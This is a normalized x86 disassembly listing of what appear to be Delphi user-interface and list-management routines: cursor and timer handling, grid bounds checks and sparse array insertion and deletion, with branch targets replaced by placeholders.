mov esi eax
xor ebx ebx
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x28e ]
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4473b8
push ebx
call SetCursor
jmp r-xdata
mov [ esp ] al
lea edx [ esp + 0x10 ]
mov eax esi
call sub_46c800
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx [ esi + 0x278 ]
mov edx [ esi + 0x274 ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0xcc ]
jmp r-xdata
add esp 0x70
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff1
call sub_46113c
mov ebx eax
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff2
call sub_46113c
mov ebx eax
sub_4701e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4474b8
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esp
mov eax ebx
call sub_46f8b4
mov edx esp
mov eax ebx
call sub_46d7a4
mov eax ebx
call sub_46fea0
mov eax edi
call sub_448d84
cmp eax [ esi + 0x4 ]
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_470230
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_447370
mov eax ebx
call sub_46e7ac
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_470288
push ebp
mov ebp esp
add esp 0xffffff98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_470311
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call KillTimer
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470318
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_46c800
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_46d1f4
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d334
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call KillTimer
jmp r-xdata
sub_470330
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_470288
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_47035c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4482e0
pop esi
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_442644
sub_470394
push ebx
push esi
mov ebx edx
mov esi eax
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax esi
call sub_46bb28
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4703b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x249 ] 0x4
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0xd
jne r-xdata
mov [ esi + 0xc ] 0x1
sub_4703dc
add esp 0xffffffec
mov [ esp ] dl
mov edx [ eax + 0x210 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x21c ]
dec edx
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x24c ]
dec edx
mov [ esp + 0x8 ] edx
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ eax + 0x238 ]
jle r-xdata
test [ esp ] 0x4
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0x4 ]
jge r-xdata
dec [ esp + 0xc ]
test [ esp ] 0x8
je r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ eax + 0x23c ]
jle r-xdata
inc [ esp + 0xc ]
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x8 ]
jge r-xdata
dec [ esp + 0x10 ]
lea edx [ esp + 0xc ]
call sub_46dde4
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x10 ]
je r-xdata
inc [ esp + 0x10 ]
add esp 0x14
retn
sub_470490
push ebx
push esi
push edi
add esp 0xffffff88
mov edi eax
mov al [ edi + 0x28e ]
sub al 0x1
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x70 ]
mov edx esp
mov eax edi
call sub_442094
mov eax [ esp + 0x70 ]
mov [ esp ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax edi
call sub_46c800
mov bl [ r-xdata ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
call sub_46c7a4
mov al [ edi + 0x28e ]
dec al
je r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
sub al 0x3
je r-xdata
add esp 0x78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_441f54
mov esi eax
sub esi [ esp + 0x24 ]
mov eax edi
call sub_441f54
sub eax [ esp + 0x14 ]
mov edx [ esp ]
cmp esi edx
jle r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x14 ]
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x44 ]
push eax
push 0x1
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax edi
call sub_46f6fc
jmp r-xdata
dec al
jne r-xdata
cmp eax edx
jge r-xdata
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x24 ]
jle r-xdata
or bl 0x1
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax edi
call sub_46f6fc
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x44 ]
jge r-xdata
or bl 0x1
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x54 ]
jle r-xdata
or bl 0x4
jmp r-xdata
mov al [ r-xdata ]
cmp al bl
je r-xdata
or bl 0x8
mov edx ebx
mov eax edi
mov si 0xffa6
call sub_403540
sub_470654
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_449088
test al al
je r-xdata
test [ ebx + 0x1c ] 0x40
jne r-xdata
mov eax ebx
call sub_45a2f0
test eax eax
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_470690
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_442fc0
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x24c ]
dec edx
mov eax [ ebx + 0x22c ]
cmp edx eax
jle r-xdata
mov al 0x1
mov edx eax
inc edx
mov eax ebx
call sub_46fcb0
sub_4706dc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_44300c
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x22c ]
cmp eax [ ebx + 0x23c ]
jle r-xdata
mov al 0x1
mov edx eax
dec edx
mov eax ebx
call sub_46fcb0
sub_4707a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_404094
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_4707e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_404094
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_470848
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_470878
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4708a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax ebx
call sub_441f54
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_441f54
mov esi eax
sub esi [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] eax
xor edx edx
mov eax ebx
call sub_46ccec
mov dl 0x1
mov eax ebx
call sub_46ccec
sub_470988
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx [ r-xdata ]
mov eax 0x8
call sub_404e3c
mov ebx eax
mov [ ebx ] edi
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_4040e8
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_470b84
push ebx
push esi
push ecx
mov esi ecx
mov ebx edx
mov [ esp ] eax
movzx eax si
mov edx eax
shl edx 0x2
mov eax esp
call sub_402734
movzx edx si
movzx eax [ ebx ]
sub edx eax
shl edx 0x2
mov ecx [ esp ]
lea eax [ ecx + eax * 4 ]
xor ecx ecx
call sub_402d44
mov [ ebx ] si
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_470bc0
push ebx
push esi
push edi
mov esi edx
shl esi 0x2
movzx edi si
mov eax edi
call sub_4026f4
mov ebx eax
mov edx edi
mov eax ebx
xor ecx ecx
call sub_402d44
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_470be8
push ebx
push esi
test dl dl
je r-xdata
xor ebx ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] 0x0
mov [ eax + 0x10 ] 0xffffffff
xor ebx ebx
mov bl cl
movzx esi [ ebx + rw-data ]
inc esi
mov [ eax + 0x14 ] si
movzx esi [ ebx + rw-data ]
mov [ eax + 0xa ] si
xor ecx ecx
mov cl [ ebx + rw-data ]
mov [ eax + 0xc ] cx
mov [ eax + 0x18 ] 0xffffffff
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_470c4c
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov esi eax
xor ebp ebp
mov di [ esi + 0x14 ]
shl edi 0x2
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp ebp eax
jl r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + ebp * 4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
inc ebp
movzx edx di
call sub_402714
test bl bl
jle r-xdata
movzx edx [ esi + 0x8 ]
shl edx 0x2
call sub_402714
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_470ca4
push ebx
cmp edx [ eax + 0x18 ]
jne r-xdata
mov cx [ eax + 0xc ]
mov ebx edx
shr ebx cl
mov ecx ebx
movzx ebx [ eax + 0x8 ]
cmp ecx ebx
jb r-xdata
mov ecx [ eax + 0x1c ]
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov ecx [ ebx + ecx * 4 ]
test ecx ecx
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ecx
pop ebx
retn
test ecx ecx
jne r-xdata
movzx ebx [ eax + 0xa ]
and ebx edx
shl ebx 0x2
add ecx ebx
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ecx
sub_470cf0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov cx [ ebx + 0xc ]
mov esi edi
shr esi cl
cmp si [ ebx + 0x8 ]
jb r-xdata
mov ebp [ ebx + 0x4 ]
lea ecx [ esi + 0x1 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_470b84
mov ebp eax
jmp r-xdata
movzx edx [ ebx + 0xa ]
and edx edi
shl edx 0x2
add eax edx
cmp edi [ ebx + 0x10 ]
jle r-xdata
movzx eax si
mov dx [ ebx + 0x14 ]
call sub_470bc0
movzx edx si
mov [ ebp + edx * 4 ] eax
mov [ ebx + 0x4 ] ebp
movzx eax si
mov eax [ ebp + eax * 4 ]
test eax eax
jne r-xdata
mov [ ebx + 0x18 ] 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edi
sub_470d5c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_470cf0
mov [ eax ] esi
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_470ca4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_470e44
sub_470d90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x18 ]
mov ebx [ eax + edx * 4 ]
test ebx ebx
je r-xdata
inc [ ebp - 0x18 ]
xor edi edi
mov cx [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
shl eax cl
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax [ esi + 0x14 ]
cmp edi eax
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
add ebx 0x4
inc edi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x14 ] eax
sub_470e1c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp eax [ ecx + 0x10 ]
jle r-xdata
xor ecx ecx
test edx edx
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
sub_470e44
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0xffffffff
mov edx sub_470e1c
mov eax [ ebp - 0x4 ]
call sub_470d90
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x10 ] edx
pop ecx
pop ecx
pop ebp
retn
sub_470e70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
call sub_4710c8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_470ea8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_470ed0
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov dl [ ebx + 0xc ]
mov eax ebx
call sub_4710c8
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
sub_470ef0
push ebx
push esi
push edi
push ebp
mov ebx eax
test edx edx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edx [ ebx + 0x8 ]
jge r-xdata
mov esi edx
mov edi [ ebx + 0x8 ]
dec edi
sub edi esi
jl r-xdata
xor ecx ecx
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_470d5c
dec [ ebx + 0x8 ]
inc edi
lea edx [ esi + 0x1 ]
mov ebp [ ebx + 0x4 ]
mov eax ebp
call sub_470ca4
mov ecx eax
mov edx esi
mov eax ebp
call sub_470d5c
inc esi
dec edi
jne r-xdata
sub_470f3c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_470f84
mov ebp eax
mov edx edi
mov eax ebx
call sub_470f84
mov ecx eax
mov edx esi
mov eax ebx
call sub_4710e8
mov ecx ebp
mov edx edi
mov eax ebx
call sub_4710e8
pop ebp
pop edi
pop esi
pop ebx
retn
sub_470f84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_470fdf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_470ca4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470fe6
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov ecx ebx
mov eax [ r-xdata ]
call sub_4142c0
sub_470ff0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_471084
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jge r-xdata
mov ebx [ esi + 0x8 ]
cmp edi ebx
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax [ r-xdata ]
call sub_4142c0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4 ]
call sub_470d5c
cmp edi [ esi + 0x8 ]
jle r-xdata
mov edx ebx
dec edx
mov eax [ esi + 0x4 ]
call sub_470ca4
mov ecx eax
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_470d5c
dec ebx
cmp edi ebx
jl r-xdata
inc [ esi + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47108b
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov [ esi + 0x8 ] edi
sub_471094
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_470f84
mov ebp eax
mov edx esi
mov eax ebx
call sub_470ef0
mov ecx ebp
mov edx edi
mov eax ebx
call sub_470ff0
sub_4710c8
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0xc ] bl
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470be8
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4710e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471150
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jge r-xdata
mov ecx edi
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_470d5c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
inc eax
mov [ ebx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471157
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4142c0
sub_471160
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470e70
mov [ esi + 0x10 ] eax
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4711b4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x10 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4711e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47124f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_418190
mov esi eax
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471256
lea eax [ ebp - 0x8 ]
call sub_404094
retn
push 0x0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418ee0
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
call sub_418190
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x64 ]
dec esi
test esi esi
jg r-xdata
sub_471270
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
xchg edx eax
call sub_419a18
mov edx [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419b34
xor eax eax
pop ebx
pop ebp
retn
sub_471298
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx sub_471260
mov eax [ ebx + 0x10 ]
call sub_470f78
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419a18
mov edx sub_471270
mov eax [ ebx + 0x10 ]
call sub_470f78
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471301
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_470f84
mov ebx eax
test ebx ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040e8
mov eax esi
call sub_404094
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47133c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_470f84
test eax eax
jne r-xdata
mov eax [ eax ]
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_47135c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_470f84
mov esi eax
test esi esi
jne r-xdata
mov edi [ esi ]
xor edi edi
jmp r-xdata
mov edx edi
mov eax [ esp ]
call sub_470988
mov ecx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_4710e8
test edi edi
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov eax ebx
call sub_471404
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4709b4
xor ecx ecx
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_4710e8
jmp r-xdata
test esi esi
je r-xdata
sub_4713c4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_470f84
test eax eax
je r-xdata
test esi esi
je r-xdata
mov [ eax ] esi
jmp r-xdata
mov eax ebx
call sub_471404
pop edi
pop esi
pop ebx
retn
mov edx esi
xor eax eax
call sub_470988
mov ecx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4710e8
sub_471418
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_470f84
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_470ef0
mov eax ebx
call sub_471404
pop esi
pop ebx
retn
call sub_4709b4
sub_471454
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_470988
mov ecx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_470ff0
mov eax ebx
call sub_471404
pop edi
pop esi
pop ebx
retn
sub_4714b0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x10 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4714f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4715e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414dc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4715e7
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
call sub_414e60
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
xor eax eax
push ebp
push sub_4715b9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414f1c
retn
inc ebx
mov [ ebp - 0x8 ] ebx
xor ebx ebx
